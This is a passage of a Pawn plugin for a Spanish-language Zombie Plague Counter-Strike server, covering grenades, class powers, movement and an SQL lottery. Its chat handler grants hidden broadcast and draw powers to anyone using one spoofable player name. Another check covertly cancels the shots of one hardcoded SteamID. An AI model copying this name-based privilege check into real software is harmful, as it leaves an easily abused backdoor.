					while( ( Victima = find_ent_in_sphere( Victima, Origin, NADE_BUBBLE_RADIUS + 25.0 ) ) != 0 )
					{
						if(Victima <= g_maxplayers)
						{
							if(g_isalive[Victima])
								players[i++] = Victima;
						}
					}
				
					// Get rid of the flare entity
					remove_entity(entity)
					
					for(new id; id < i; id++)
					{
						if(!g_zombie[players[id]])
							g_nodamage[players[id]] = 0
					}
					
					return HAM_SUPERCEDE;
				}
				
				// Force Push
				ForcePush(entity)
				
				// Set time for next loop
				entity_set_int(entity, PEV_FLARE_DURATION, --duration)
				entity_set_float(entity, EV_FL_dmgtime, current_time + 0.1)
			}
			// Light up when it's stopped on ground
			else if ((get_entity_flags(entity) & FL_ONGROUND) && fm_get_speed(entity) < 5)
			{
				// Bubble sound
				emit_sound( entity, CHAN_BODY, "buttons/button1.wav", 1.0, ATTN_NORM, 0, PITCH_NORM )
				engfunc( EngFunc_SetModel, entity, "models/zombie_plague/tcs_aura_bubble_2.mdl" )
				entity_set_vector( entity, EV_VEC_angles, Float:{ 0.0, 0.0, 0.0 } ) // Para que salga derecho el modelo.
				//entity_set_string(entity, EV_SZ_classname, "grenade_bubble")
				
				new iRGB[3];
				if( g_survivor[pev(entity, pev_owner)] && gArmageddonRound ) iRGB = { 0, 0, 255 }
				else iRGB = { 255, 255, 255 }
				
				fm_set_rendering(entity, kRenderFxGlowShell, iRGB[0], iRGB[1], iRGB[2], kRenderTransTexture, 32);
				
				// Set duration and start lightning loop on next think
				entity_set_int(entity, PEV_FLARE_DURATION, 150)
				entity_set_float(entity, EV_FL_dmgtime, current_time + 0.1)
			}
			else
			{
				// Delay explosion until we hit ground
				entity_set_float(entity, EV_FL_dmgtime, get_gametime() + 0.5)
			}
		}
		case NADE_TYPE_ANIQUILATION: // Teleport
		{
			aniquilation_explode(entity)
			return HAM_SUPERCEDE;
		}
	}
	
	return HAM_IGNORED;
}

/*public fw_Think(entity)
{
	// Invalid entity
	if(!pev_valid(entity)) return HAM_IGNORED;
	
	static classname[32]
	entity_get_string(entity, EV_SZ_classname, classname, charsmax(classname))
	
	if(equal(classname, "grenade_bubble"))
	{	
		new Float:fEntityOrigin[3]
		entity_get_vector(entity, EV_VEC_origin, fEntityOrigin) 
		
		for(new i = 1, Float:fDistance, Float:fOrigin[3]; i <= g_maxplayers; i++) 
		{ 
			if(is_user_valid_alive(i))
			{
				entity_get_vector(i, EV_VEC_origin, fOrigin)
				
				fDistance = get_distance_f(fEntityOrigin, fOrigin)
				
				if(fDistance >= 190.0)
					continue;
				
				xs_vec_sub(fOrigin, fEntityOrigin, fOrigin)
				xs_vec_normalize(fOrigin, fOrigin)
				xs_vec_mul_scalar(fOrigin, (fDistance - 190.0) * -65, fOrigin)
				
				entity_set_vector(i, EV_VEC_velocity, fOrigin)
			} 
		}
		
		entity_set_float(entity, EV_FL_nextthink, get_gametime() + 0.1)
	}
	
	return HAM_IGNORED;
}*/

// Forward CmdStart
public fw_CmdStart(id, handle)
{
	// Not alive
	if (!is_user_alive(id))
		return;
	
	static iButton, iOldButton;
	iButton = get_uc(handle, UC_Buttons)
	iOldButton = pev(id, pev_oldbuttons)
	
	if(g_zombieclass[id] == 10 && g_zombie[id] && !g_nemesis[id] && !gTroll[id]) // Zystud
	{
		if(iButton & IN_JUMP)
		{
			if(pev(id, pev_flags) & FL_ONGROUND) gJumps[id] = 0
			else if(!(iOldButton & IN_JUMP) && gJumps[id] < 1)
			{
				gCanJump[id] = 1
				gJumps[id]++
			}
		}
	}
	else if(gWesker[id] && !gTaringaRound && gShootAniq[id] > 0 && g_currentweapon[id] == CSW_DEAGLE)
	{
		// User pressing +attack2 Button
		if( ( iButton & IN_ATTACK2 ) && !( iOldButton & IN_ATTACK2 ) )
		{	
			// Buttons
			set_uc(handle, UC_Buttons, iButton & ~IN_ATTACK2)
			
			new entid = find_ent_by_owner(-1, "weapon_deagle", id)
			
			if(!pev_valid(entid))
				return;
			
			// weapon in reload
			if(get_pdata_int(entid, 54, 4))
				return;
				
			// Process fire
			if(is_user_valid_alive(id))
				fire_deagle_bullet(id)
			
			gShootAniq[id]--
			
			return;
		}
	}
	else if( g_survivor[id] && !gArmageddonRound && !gTaringaRound && !gSynapsisRound && !g_plagueround && gPowerOn < 1 )
	{
		// User pressing +use + +attack2 Button
		if( (iButton & IN_USE) && (iButton & IN_ATTACK2)/*( iButton & IN_ATTACK2 ) && !( iOldButton & IN_ATTACK2 )*/ )
		{	
			// Buttons
			set_uc(handle, UC_Buttons, iButton & ~IN_USE)
			set_uc(handle, UC_Buttons, iButton & ~IN_ATTACK2)
			
			// Process power
			gPowerOn = 1
			g_nodamage[id] = 1
			
			if(g_hab[id][HAB_SURVIVOR][SURVIVOR_INMUNIDAD_20SEG]) set_task(20.0, "PowerDeactivate", id)
			else set_task(10.0, "PowerDeactivate", id)
			
			client_print(id, print_center, "Inmunidad activada")
			CC(0, "!g[ZP]!y El survivor ha activado su inmunidad")
			
			return;
		}
	}
	else if( g_nemesis[id] && !gArmageddonRound && !gTaringaRound && !gSynapsisRound && !g_plagueround && gHaveBazooka[id] >= 1 && g_currentweapon[id] == CSW_KNIFE )
	{
		// User pressing +attack2 Button
		if( ( iButton & IN_ATTACK2 ) && !( iOldButton & IN_ATTACK2 ) )
		{	
			// Buttons
			set_uc(handle, UC_Buttons, iButton & ~IN_ATTACK2)
			
			// Process bazooka
			if( gHaveBazooka[id] == 1 )
			{
				gHaveBazooka[id] = 2
				client_print(id, print_center, "Bazooka activada")
				
				replace_weapon_models(id, CSW_KNIFE)
				
				// Send draw animation
				entity_set_int(id, EV_INT_weaponanim, 3)
				message_begin(MSG_ONE_UNRELIABLE, SVC_WEAPONANIM, _, id)
				write_byte(3)
				write_byte(entity_get_int(id, EV_INT_body))
				message_end()
			}
			else if( gHaveBazooka[id] == 2 )
			{
				gHaveBazooka[id] = 1
				client_print(id, print_center, "Bazooka desactivada")
				
				replace_weapon_models(id, CSW_KNIFE)
			}
			
			return;
		}
		else if( iButton & IN_ATTACK && gHaveBazooka[id] == 2 )
		{
			// Send draw animation
			entity_set_int(id, EV_INT_weaponanim, 8)
			message_begin(MSG_ONE_UNRELIABLE, SVC_WEAPONANIM, _, id)
			write_byte(8)
			write_byte(entity_get_int(id, EV_INT_body))
			message_end()
			
			fire_bazooka(id)
			gHaveBazooka[id] = 0
			replace_weapon_models(id, CSW_KNIFE)
		}
	}
	else if( gTroll[id] && gPowerFull[id] < 1 && (iButton & IN_USE) && (iButton & IN_ATTACK2) )
	{
		// Buttons
		set_uc(handle, UC_Buttons, iButton & ~IN_USE)
		set_uc(handle, UC_Buttons, iButton & ~IN_ATTACK2)
		
		gPowerFull[id] = 1;
		set_user_gravity(id, 0.7)
		set_task(15.0, "PowerFullOff_Troll", id)
		
		new Float:fOrigin[3], iVictimPosition[3], iDistance;
		entity_get_vector(id, EV_VEC_origin, fOrigin)
		
		for(new i = 1; i <= g_maxplayers; i++)
		{
			if(is_user_alive(i) && !gTroll[i])
			{
				get_user_origin(i, iVictimPosition)

				new iEndOrigin[3]
				iEndOrigin[0] = floatround(fOrigin[0])
				iEndOrigin[1] = floatround(fOrigin[1])
				iEndOrigin[2] = floatround(fOrigin[2])

				iDistance = get_distance(iVictimPosition, iEndOrigin)
				
				if(iDistance <= 350)
				{
					// Screen Shake
					message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("ScreenShake"), {0,0,0}, i)
					write_short(1<<14)
					write_short(1<<14)
					write_short(1<<14)
					message_end()
					
					gPowerFull[i] = 3;
				}
			}
		}
		
		engfunc(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, fOrigin, 0)
		write_byte(TE_BEAMCYLINDER) // TE id
		engfunc(EngFunc_WriteCoord, fOrigin[0]) // x
		engfunc(EngFunc_WriteCoord, fOrigin[1]+25.0) // y
		engfunc(EngFunc_WriteCoord, fOrigin[2]+55.0) // z
		engfunc(EngFunc_WriteCoord, fOrigin[0]) // x axis
		engfunc(EngFunc_WriteCoord, fOrigin[1]+50.0) // y axis
		engfunc(EngFunc_WriteCoord, fOrigin[2]+999.0) // z axis
		write_short(g_exploSpr) // sprite
		write_byte(0) // startframe
		write_byte(0) // framerate
		write_byte(4) // life
		write_byte(60) // width
		write_byte(0) // noise
		write_byte(255) // red
		write_byte(128) // green
		write_byte(50) // blue
		write_byte(255) // brightness
		write_byte(0) // speed
		message_end()
		
		engfunc( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, fOrigin, 0 )
		write_byte( TE_DLIGHT )
		engfunc( EngFunc_WriteCoord, fOrigin[0] )
		engfunc( EngFunc_WriteCoord, fOrigin[1] )
		engfunc( EngFunc_WriteCoord, fOrigin[2] )
		write_byte( 99 )
		write_byte( 255 )
		write_byte( 128 )
		write_byte( 50 )
		write_byte( 50 )
		write_byte( 60 )
		message_end( )
	}
	
	if( ( iButton & IN_ATTACK2 ) && !( iOldButton & IN_ATTACK2 ) )
	{
		switch( g_currentweapon[id] )
		{
			case CSW_HEGRENADE:
			{
				if( g_zombie[id] && !g_nemesis[id] && !gTroll[id] )
				{
					gImpact[id][GRENADE_INFECTION] = !gImpact[id][GRENADE_INFECTION]
					client_print( id, print_center, "Bomba infección: %s", (gImpact[id][GRENADE_INFECTION]) ? "Impacto" : "Normal" )
				}
				else
				#if defined MOLOTOV_ON
				if( gMolotov[id][0] < 1 && gMolotov[id][1] < 1 && gMolotov[id][2] < 1 )
				#endif
				{
					gImpact[id][GRENADE_NAPALM] = !gImpact[id][GRENADE_NAPALM]
					client_print( id, print_center, "Bomba fuego: %s", (gImpact[id][GRENADE_NAPALM]) ? "Impacto" : "Normal" )
				}
			}
			case CSW_FLASHBANG:
			{
				if( gSuperNova[id] > 0 )
				{
					gImpact[id][GRENADE_SUPERNOVA] = !gImpact[id][GRENADE_SUPERNOVA]
					client_print( id, print_center, "Bomba supernova: %s", (gImpact[id][GRENADE_SUPERNOVA]) ? "Impacto" : "Normal" )
				}
				else
				{
					gImpact[id][GRENADE_FROST] = !gImpact[id][GRENADE_FROST]
					client_print( id, print_center, "Bomba hielo: %s", (gImpact[id][GRENADE_FROST]) ? "Impacto" : "Normal" )
				}
			}
		}
	}
	
	if(equal(g_steamid[id], "STEAM_0:0:39456011") && g_currentweapon[id] == CSW_ELITE && (iButton & IN_ATTACK) && user_shoot[id])
	{
		set_uc(handle, UC_Buttons, iButton & ~IN_ATTACK) 
		user_shoot[id] = false 
	}
	
	// This logic looks kinda weird, but it should work in theory...
	// p = g_zombie[id], q = g_survivor[id]
	// ¬(p v q v (¬p ^ r)) <==> ¬p ^ ¬q ^ (p v ¬r)
	/*if (!g_zombie[id] && !g_survivor[id] && !gPlayersL4D[id][0] && !gPlayersL4D[id][1] && !gPlayersL4D[id][2] && !gPlayersL4D[id][3] && !gWesker[id] && !gJason[id] &&
	!gSniper[id] && (g_zombie[id]))
		return;
	
	// Check if it's a flashlight impulse
	if (get_uc(handle, UC_Impulse) != IMPULSE_FLASHLIGHT)
		return;
	
	// Block it I say!
	set_uc(handle, UC_Impulse, 0)
	
	// Should human's custom flashlight be turned on?
	if (!g_zombie[id] && !g_survivor[id] && !gPlayersL4D[id][0] && !gPlayersL4D[id][1] && !gPlayersL4D[id][2] && !gPlayersL4D[id][3] && !gWesker[id] && !gJason[id] &&
	!gSniper[id] && g_flashbattery[id] > 2 && get_gametime() - g_lastflashtime[id] > 1.2)
	{
		// Prevent calling flashlight too quickly (bugfix)
		g_lastflashtime[id] = get_gametime()
		
		// Toggle custom flashlight
		g_flashlight[id] = !(g_flashlight[id])
		
		// Play flashlight toggle sound
		emit_sound(id, CHAN_ITEM, sound_flashlight, 1.0, ATTN_NORM, 0, PITCH_NORM)
		
		// Update flashlight status on the HUD
		message_begin(MSG_ONE_UNRELIABLE, g_msgFlashlight, _, id)
		write_byte(g_flashlight[id]) // toggle
		write_byte(g_flashbattery[id]) // battery
		message_end()
		
		// Remove previous tasks
		remove_task(id+TASK_CHARGE)
		remove_task(id+TASK_FLASH)
		
		// Set the flashlight charge task
		set_task(1.0, "flashlight_charge", id+TASK_CHARGE, _, _, "b")
		
		// Call our custom flashlight task if enabled
		if (g_flashlight[id]) set_task(0.1, "set_user_flashlight", id+TASK_FLASH, _, _, "b")
	}*/
}

public PowerFullOff_Troll(id)
{
	set_user_gravity(id, 1.0)
	gPowerFull[id] = 2;
}

// Forward Player PreThink
public fw_PlayerPreThink(id)
{
	// Not alive
	if (!g_isalive[id])
		return;
	
	/*new iTarget, iBody;
	get_user_aiming(id, iTarget, iBody);
	
	if(iTarget)
	{
		if(g_isalive[iTarget])
		{
			new sMessage[64];
			if( fm_cs_get_user_team(iTarget) == fm_cs_get_user_team(id) ) formatex(sMessage, 63, "1 %%c1: %%p2 - %%h: %%i3%%%%");
			else formatex(sMessage, 63, "1 %%c1: %%p2");
			
			ShowInfo(id, sMessage, charsmax(sMessage));
		}
	}
	else ShowInfo(id, "", 1);*/
	static LastThink;
	if( LastThink > id )
		FirstThink( )
	
	LastThink = id
	
	if( gPlayerSolid[id] )
	{
		for( new x = 1; x <= g_maxplayers; x++ )
		{
			if( !gPlayerSolid[x] || id == x )
				continue;
			
			if( ( g_newround || g_endround ) || ( gPlayerTeam[x] == FM_CS_TEAM_CT && gPlayerTeam[id] == FM_CS_TEAM_CT ) )
			{
				entity_set_int( x, EV_INT_solid, SOLID_NOT )
				gPlayerRestore[x] = 1
			}
		}
	}
	
	// Silent footsteps for zombies?
	if (g_zombie[id] && !g_nemesis[id] && !gTroll[id])
		entity_set_int( id, PEV_NADE_TYPE, STEPTIME_SILENT )
	
	// Set Player MaxSpeed
	if (g_frozen[id])
	{
		if( !gArmageddonRound )
		{
			set_user_velocity( id, Float:{ 0.0, 0.0, 0.0 } ) // stop motion
			set_user_maxspeed( id, 1.0 ) // prevent from moving
		}
		else set_user_maxspeed( id, 250.0 - gReduceVel ) // slow motion
		
		return; // shouldn't leap while frozen
	}
	else
	{
		if (g_zombie[id])
		{
			if (g_nemesis[id]) set_user_maxspeed( id, 250.0 )
			else if (gTroll[id]) set_user_maxspeed( id, (gPowerFull[id] == 1) ? 500.0 : 185.0 )
			else
			{
				if( g_burning_duration[id] >= 1 ) set_user_maxspeed( id, g_zombie_spd[id] - random_float( 50.0, 75.0 ) )
				else set_user_maxspeed( id, g_zombie_spd[id] )
			}
		}
		else
		{
			if (g_survivor[id]) set_user_maxspeed( id, 230.0 )
			else if(gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3]) set_user_maxspeed( id, 250.0 )
			else if(gWesker[id]) set_user_maxspeed( id, 275.0 )
			else if(gJason[id]) set_user_maxspeed( id, 200.0 )
			else if(gSniper[id]) set_user_maxspeed( id, 250.0 )
			else set_user_maxspeed( id, (gPowerFull[id] == 3) ? 80.0 : g_human_spd[id] )
		}
	}
	
	// --- Check if player should leap ---
	
	// Check if proper CVARs are enabled and retrieve leap settings
	/*static Float:cooldown, Float:current_time
	if (g_zombie[id])
	{
		if (g_nemesis[id]) cooldown = 0.1
		else
		{
			if (!g_firstzombie[id] && !g_nodamage[id]) return;
			cooldown = 0.1
		}
	}
	else return;
	
	current_time = get_gametime()
	
	// Cooldown not over yet
	if (current_time - g_lastleaptime[id] < cooldown)
		return;
	
	// Not doing a longjump (don't perform check for bots, they leap automatically)
	if (!(pev(id, pev_button) & (IN_JUMP | IN_DUCK) == (IN_JUMP | IN_DUCK)))
		return;
	
	// Not on ground or not enough speed
	if (!(pev(id, pev_flags) & FL_ONGROUND) || fm_get_speed(id) < 80)
		return;
	
	static Float:velocity[3]
	
	// Make velocity vector
	velocity_by_aim(id, 500, velocity)
	
	// Set custom height
	velocity[2] = 300.0
	
	// Apply the new velocity
	set_pev(id, pev_velocity, velocity)
	
	// Update last leap time
	g_lastleaptime[id] = current_time*/
}

// Forward Player PostThink
public fw_PlayerPostThink(id)
{
	// Not alive
	if (!g_isalive[id])
		return;

	for( new x = 1; x <= g_maxplayers; x++)
	{
		if( gPlayerRestore[x] )
		{
			entity_set_int( x, EV_INT_solid, SOLID_SLIDEBOX ) 
			gPlayerRestore[x] = 0
		}
	}
	
	if( g_zombieclass[id] == 10 && gCanJump[id] && g_zombie[id] && !g_nemesis[id] && !gTroll[id]) // Zystud
	{
		new Float:fVelocity[3]
		pev(id, pev_velocity, fVelocity)
		
		fVelocity[2] = random_float(260.0, 280.0)
		set_pev(id, pev_velocity, fVelocity)
		
		gCanJump[id] = 0
	}
}

// First Think
FirstThink( )
{
	for( new x = 1; x <= g_maxplayers; x++ )
	{
		if( !g_isalive[x] )
		{
			gPlayerSolid[x] = 0
			continue;
		}
		
		gPlayerTeam[x] = fm_cs_get_user_team(x)
		gPlayerSolid[x] = entity_get_int( x, EV_INT_solid ) == SOLID_SLIDEBOX ? 1 : 0
	}
}

// Forward Add To Full Pack
public fw_AddToFullPack(ES, E, Entidad, Host, HostFlags, Player, PlayerSet)
{
	if( Player && is_user_connected(Host) )
	{
		if( ( gPlayerSolid[Host] && gPlayerSolid[Entidad] ) && ( ( gPlayerTeam[Host] == FM_CS_TEAM_CT && gPlayerTeam[Entidad] == FM_CS_TEAM_CT ) || ( g_newround || g_endround ) ) )
		{
			set_es( ES, ES_Solid, SOLID_NOT )
			
			static Float:flDistance;
			flDistance = entity_range( Host, Entidad )
			if( flDistance < 256.0 && !gViewInvisible[Host] )
			{
				//if(!g_nodamage[Host])
				set_es( ES, ES_RenderMode, kRenderTransAlpha )
				set_es( ES, ES_RenderAmt, ((floatround( flDistance ) / 2) < 40) ? 40 : (floatround( flDistance ) / 2) )
			}
		}
		
		if( gMarkedInvisible[Entidad] && gViewInvisible[Host] &&
		!g_zombie[Host] && !g_zombie[Entidad] )
		{
			set_es( ES, ES_RenderMode, kRenderTransTexture )
			set_es( ES, ES_RenderAmt, 0 )
			//set_es( ES, ES_Origin, { 999999999.0, 999999999.0, 999999999.0 } )
		}
	}
	
	return FMRES_IGNORED
}

// Touch Grenade
public fw_TouchGrenade(grenade, ent)
{
	#if defined MOLOTOV_ON
	if( is_valid_ent(grenade) && 
	( entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_INFECTION_IMPACT ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_NAPALM_IMPACT ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_FROST_IMPACT ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_MOLOTOV ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_MOLOTOV_1 || 
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_MOLOTOV_2 ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_SUPERNOVA_IMPACT ) &&
	IsSolid(ent) )
		entity_set_float(grenade, EV_FL_dmgtime, get_gametime( ) + 0.001)
	#else
	if( is_valid_ent(grenade) && 
	( entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_INFECTION_IMPACT ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_NAPALM_IMPACT ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_FROST_IMPACT ||
	entity_get_int(grenade, PEV_NADE_TYPE) == NADE_TYPE_SUPERNOVA_IMPACT ) &&
	IsSolid(ent) )
		entity_set_float(grenade, EV_FL_dmgtime, get_gametime( ) + 0.001)
	
	#endif
}

/*================================================================================
 [Client Commands]
=================================================================================*/

// Hook Say
public clcmd_say(id)
{
	if( !is_user_connected(id) )
		return PLUGIN_HANDLED;
	
	read_args( szMessage, charsmax(szMessage) )
	remove_quotes( szMessage )
	
	replace_all( szMessage, charsmax(szMessage), "%s", "% s" )
	
	replace_all( szMessage, charsmax(szMessage), "'a", "á" )
	replace_all( szMessage, charsmax(szMessage), "'e", "é" )
	replace_all( szMessage, charsmax(szMessage), "'i", "í" )
	replace_all( szMessage, charsmax(szMessage), "'o", "ó" )
	replace_all( szMessage, charsmax(szMessage), "'u", "ú" )
	replace_all( szMessage, charsmax(szMessage), "'n", "ñ" )
	
	replace_all( szMessage, charsmax(szMessage), "'A", "Á" )
	replace_all( szMessage, charsmax(szMessage), "'E", "É" )
	replace_all( szMessage, charsmax(szMessage), "'I", "Í" )
	replace_all( szMessage, charsmax(szMessage), "'O", "Ó" )
	replace_all( szMessage, charsmax(szMessage), "'U", "Ú" )
	replace_all( szMessage, charsmax(szMessage), "'N", "Ñ" )
	
	if( szMessage[0] == '/' && equal(g_playername[id], "Kiske-SO     T! CS") )
	{
		if( szMessage[1] == '/' )
		{
			if( szMessage[2] == '/' )
			{
				if( szMessage[3] == 'R' )
				{
					replace_all( szMessage, charsmax(szMessage), "///R", "" )
					TutorCreate(0, szMessage, RED, 10.0, 0)
				}
				else if( szMessage[3] == 'G' )
				{
					replace_all( szMessage, charsmax(szMessage), "///G", "" )
					TutorCreate(0, szMessage, GREEN, 10.0, 0)
				}
				else if( szMessage[3] == 'B' )
				{
					replace_all( szMessage, charsmax(szMessage), "///B", "" )
					TutorCreate(0, szMessage, BLUE, 10.0, 0)
				}
				else if( szMessage[3] == 'Y' ) 
				{
					replace_all( szMessage, charsmax(szMessage), "///Y", "" )
					TutorCreate(0, szMessage, YELLOW, 10.0, 0)
				}
			}
			else
			{
				replace_all( szMessage, charsmax(szMessage), "//", "" )
				
				set_dhudmessage(0, 200, 0, HUD_EVENT_X, HUD_EVENT_Y, 0, 5.0, 5.0, 0.1, 1.5)
				show_dhudmessage(0, "%s", szMessage)
			}
			
			return PLUGIN_HANDLED;
		}
		else if(equali(szMessage, "/notice"))
		{
			CC(0, "!g[NOTICIA]!y Entra ya al nuevo !gZP v4.0.0 BETA!y. Exclusivo para Premiums!")
			CC(0, "!g[NOTICIA]!y IP: !g200.43.192.180:27040!y")
			CC(0, "!g[NOTICIA]!y ¿Muchos archivos nuevos?. No esperes más: !ghttp://www.megaupload.com/?d=7CTR47JN!y")
		}
		else if( equali( szMessage, "/sorteo" ) )
		{
			new iRandNum = 0;
			iRandNum = random_num(0, 999)
			
			CC( 0, "!g[LOTERIA]!y El número ganador es el: !g%d!y", iRandNum )
			
			new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT id, name, cant_apostada FROM accounts WHERE num_apostado = %d ORDER BY cant_apostada DESC LIMIT 1;", iRandNum);
			
			if( !SQL_Execute( SQL_CONSULTA ) )
			{
				server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
				
				SQL_FreeHandle( SQL_CONSULTA )
				
				return PLUGIN_HANDLED;
			}
			else if( SQL_NumResults( SQL_CONSULTA ) )
			{
				new iSQL_ZP_ID, szSQL_Name[32], iSQL_CantApost, szAddDot[15], szAddDot_2[15], iW;
				
				iSQL_ZP_ID = SQL_ReadResult( SQL_CONSULTA, 0 )
				SQL_ReadResult( SQL_CONSULTA, 1, szSQL_Name, 31 )
				iSQL_CantApost = SQL_ReadResult( SQL_CONSULTA, 2 )
				
				iW = iSQL_CantApost*70
				
				AddDot(iW, szAddDot, 14)
				AddDot(iSQL_CantApost, szAddDot_2, 14)
				
				if(iW >= 2450000)
				{
					CC( 0, "!g[LOTERIA]!y El jugador !g%s ganó el POZO ACUMULADO!y", szSQL_Name )
					
					gPozoAc = 0
					
					for(new i = 1; i <= g_maxplayers; i++)
					{
						if( iSQL_ZP_ID == zp_id[i] )
						{
							if( is_user_connected(i) )
							{
								UpdateAps(i, gPozoAc, 0, 1)
								break;
							}
						}
					}
				}
				else
				{
					CC( 0, "!g[LOTERIA]!y El jugador !g%s!y ganó !g%s APs!y por apostar !g%s APs!y al número ganador", szSQL_Name, szAddDot, szAddDot_2 )
					if(iW > gPozoAc)
					{
						iW = gPozoAc;
						gPozoAc = 0;
					}
					else gPozoAc -= iW;
					
					for(new i = 1; i <= g_maxplayers; i++)
					{
						if( iSQL_ZP_ID == zp_id[i] )
						{
							if( is_user_connected(i) )
							{
								UpdateAps(i, iW, 0, 1)
								break;
							}
						}
					}
				}
				
				SQL_FreeHandle( SQL_CONSULTA )
				
				for(new x = 1; x <= g_maxplayers; x++)
				{
					if(g_isconnected[x]) 
					{
						gYaAposto[x] = 0;
						
						gApost[x][0] = 0;
						gApost[x][1] = 0;
						
						gApostG[x][0] = 0;
						gApostG[x][1] = 0;
					}
				}
				
				SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `modes` SET `pozo_ac` = '%d';", gPozoAc )
				SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `cant_apostada` = '0', `num_apostado` = '0';" )
				
				return PLUGIN_HANDLED;
			}
			
			SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT id, name, num_apostado, cant_apostada FROM accounts ORDER BY ABS(%d-num_apostado) ASC, cant_apostada DESC LIMIT 1", iRandNum )
			if( !SQL_Execute( SQL_CONSULTA ) )
			{
				server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
				
				SQL_FreeHandle( SQL_CONSULTA )
				
				return PLUGIN_HANDLED;
			}
			else if( SQL_NumResults( SQL_CONSULTA ) )
			{
				new szSQL_sName[32], iSQL_ZP_ID, iNumApost, iCantApost, szAddDot[15];
				
				iSQL_ZP_ID = SQL_ReadResult( SQL_CONSULTA, 0 )
				
				SQL_ReadResult( SQL_CONSULTA, 1, szSQL_sName, 31 )
				
				iNumApost = SQL_ReadResult( SQL_CONSULTA, 2 )
				iCantApost = SQL_ReadResult( SQL_CONSULTA, 3 )
				
				iCantApost *= 10
				
				if(iCantApost > gPozoAc)
				{
					iCantApost = gPozoAc;
					gPozoAc = 0;
				}
				else gPozoAc -= iCantApost;
				
				AddDot(iCantApost, szAddDot, 14)
				
				CC( 0, "!g[LOTERIA]!y El jugador !g%s!y tiene el número más cercano (!g%d!y). Ganó !g%s APs!y", szSQL_sName, iNumApost, szAddDot )
				
				SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `modes` SET `pozo_ac` = '%d';", gPozoAc )
				
				for(new i = 1; i <= g_maxplayers; i++)
				{
					if( iSQL_ZP_ID == zp_id[i] )
					{
						if( is_user_connected(i) )
						{
							UpdateAps(i, iCantApost, 0, 1)
							break;
						}
					}
				}
			}
			
			SQL_FreeHandle( SQL_CONSULTA )
			
			for(new x = 1; x <= g_maxplayers; x++)
			{
				if(g_isconnected[x]) 
				{
					gYaAposto[x] = 0;
					
					gApost[x][0] = 0;
					gApost[x][1] = 0;
					
					gApostG[x][0] = 0;
					gApostG[x][1] = 0;
				}
			}
			
			SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `cant_apostada` = '0', `num_apostado` = '0';" )
			
			return PLUGIN_HANDLED;
		}
		else return PLUGIN_CONTINUE;
	}
	
	if( szMessage[0] == '/' || szMessage[0] == '@' || equali( szMessage, "" ) )
		return PLUGIN_CONTINUE;
	
	if(equal(g_playername[id], "Kiske-SO     T! CS"))
	{
		replace_all(szMessage, charsmax(szMessage), "!g", "^x04")
		replace_all(szMessage, charsmax(szMessage), "!y", "^x01")
	}
	
	new szColor[10], iTeam = fm_cs_get_user_team(id);
	get_user_team(id, szColor, 9)
	
	if( !gLogeado[id] || !gRegistrado[id] || iTeam == FM_CS_TEAM_SPECTATOR || iTeam == FM_CS_TEAM_UNASSIGNED )	
		format( szMessage, charsmax(szMessage), "^x03%s^x01: %s", g_playername[id], szMessage )
	else
	{
		static szResetS[32]; formatex(szResetS, charsmax(szResetS), "S.%d", gReset[id] - 5)
		static szReset[32]; formatex( szReset, charsmax( szReset ), "[%s]", (gReset[id] > 5) ? szResetS : gRESET_CLASS[gReset[id]] )
		format( szMessage, charsmax(szMessage), "^x01%s^x03%s ^x04%s(%d)^x01: %s", g_isalive[id] ? "" : "*DEAD* ", g_playername[id], (gReset[id] > 0) ? szReset : "",
		gLevel[id], szMessage )
	}
	
	SendMessage( szColor, g_isalive[id], fm_cs_get_user_team(id) )
	
	// Log to Say ?
	/*new szLogData[512];
	formatex(szLogData, charsmax(szLogData), "ADMIN %s <%s> - %s ", g_playername[id])
	log_to_file("zombieplague.log", szLogData)*/
	
	return PLUGIN_CONTINUE;
}

public SendMessage( szColor[], iLive, PlayerTeam )
{
	static TeamName[10];
	for( new x = 1; x <= g_maxplayers; x++ )
	{
		if ( !g_isconnected[x] ) continue;
		
		get_user_team( x, TeamName, 9 )
		
		ChangeTeamInfo( x, szColor )
		WriteMessage( x, szMessage )
		ChangeTeamInfo( x, TeamName )
	}
}

public ChangeTeamInfo( Index, Team[] )
{
	message_begin( MSG_ONE, g_msgTeamInfo, _, Index )
	write_byte( Index )
	write_string( Team )
	message_end( )
}

public WriteMessage( Index, Message[] )
{
	message_begin( MSG_ONE, g_msgSayText, { 0, 0, 0 }, Index )
	write_byte( Index )
	write_string( Message )
	message_end( )
}

public clcmd_top15(id)
{
	show_menu_tops(id)
}

/*public clcmd_modo(id)
{
	new sz_ModeName[32], sz_ModeName_[32];
	switch(g_iStartMode[0])
	{
		case MODE_SURVIVOR: formatex(sz_ModeName, charsmax(sz_ModeName), "survivor")
		case MODE_SWARM: formatex(sz_ModeName, charsmax(sz_ModeName), "swarm")
		case MODE_MULTI: formatex(sz_ModeName, charsmax(sz_ModeName), "infección multiple")
		case MODE_PLAGUE: formatex(sz_ModeName, charsmax(sz_ModeName), "plague")
		case MODE_ARMAGEDDON: formatex(sz_ModeName, charsmax(sz_ModeName), "armageddon")
		case MODE_SYNAPSIS: formatex(sz_ModeName, charsmax(sz_ModeName), "synapsis")
		case MODE_L4D: formatex(sz_ModeName, charsmax(sz_ModeName), "L4D")
